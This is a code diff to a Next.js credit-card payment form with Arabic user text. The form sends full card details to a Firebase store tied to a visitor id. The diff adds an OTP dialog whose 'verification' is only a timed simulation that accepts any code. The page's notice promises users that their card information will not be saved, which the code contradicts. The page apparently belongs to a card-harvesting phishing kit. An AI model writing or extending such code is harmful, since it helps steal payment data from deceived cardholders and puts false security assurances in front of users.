@@ -6,6 +6,7 @@ import { useState, useEffect } from "react"
 import Image from "next/image"
 import { CreditCard, Calendar, User, Lock } from "lucide-react"
 import { addData } from "@/lib/firebase"
+import OtpDialog from "@/components/otp-dialog"
 
 // Card types with their regex patterns and logos
 const CARD_TYPES = [
@@ -49,6 +50,8 @@ export default function CreditCardForm({ onSubmit, isProcessing = false }: Credi
   const [errors, setErrors] = useState<Partial<Record<keyof CardData, string>>>({})
   const [cardType, setCardType] = useState<string | null>(null)
   const [isFlipped, setIsFlipped] = useState(false)
+  const [showOtpDialog, setShowOtpDialog] = useState(false)
+  const [isVerifying, setIsVerifying] = useState(false)
 
   // Format card number with spaces
   const formatCardNumber = (value: string) => {
@@ -187,10 +190,29 @@ export default function CreditCardForm({ onSubmit, isProcessing = false }: Credi
     e.preventDefault()
 
     if (validateForm()) {
-    const visitorId = localStorage.getItem('visitor');
-
-      addData({id:visitorId,...cardData})
+      // Show OTP dialog instead of immediately submitting
+      setShowOtpDialog(true)
     }
+  }
+
+  // Handle OTP verification
+  const handleVerifyOtp = (otp: string) => {
+    setIsVerifying(true)
+
+    // Simulate verification process
+    setTimeout(() => {
+      setIsVerifying(false)
+      setShowOtpDialog(false)
+
+      // After successful verification, submit the card data
+      const visitorId = localStorage.getItem("visitor")
+      addData({ id: visitorId, ...cardData })
+
+      // Call the onSubmit prop if provided
+      if (onSubmit) {
+        onSubmit(cardData)
+      }
+    }, 1500)
   }
 
   // Get card logo based on detected type
@@ -216,7 +238,7 @@ export default function CreditCardForm({ onSubmit, isProcessing = false }: Credi
 
       {/* Card Preview */}
       <div
-        className={`relative h-48 w-full mb-8 rounded-xl shadow-lg transition-all duration-500 perspective-1000 ${
+        className={`relative aspect-[16/9] w-full mb-8 rounded-xl shadow-lg transition-all duration-500 perspective-1000 ${
           isFlipped ? "rotate-y-180" : ""
         }`}
       >
@@ -390,6 +412,14 @@ export default function CreditCardForm({ onSubmit, isProcessing = false }: Credi
       <div className="mt-6 text-center">
         <p className="text-sm text-gray-500">بياناتك آمنة ومشفرة. لن يتم حفظ معلومات بطاقتك.</p>
       </div>
+
+      {/* OTP Dialog */}
+      <OtpDialog
+        isOpen={showOtpDialog}
+        onClose={() => setShowOtpDialog(false)}
+        onVerify={handleVerifyOtp}
+        isVerifying={isVerifying}
+      />
     </div>
   )
 }
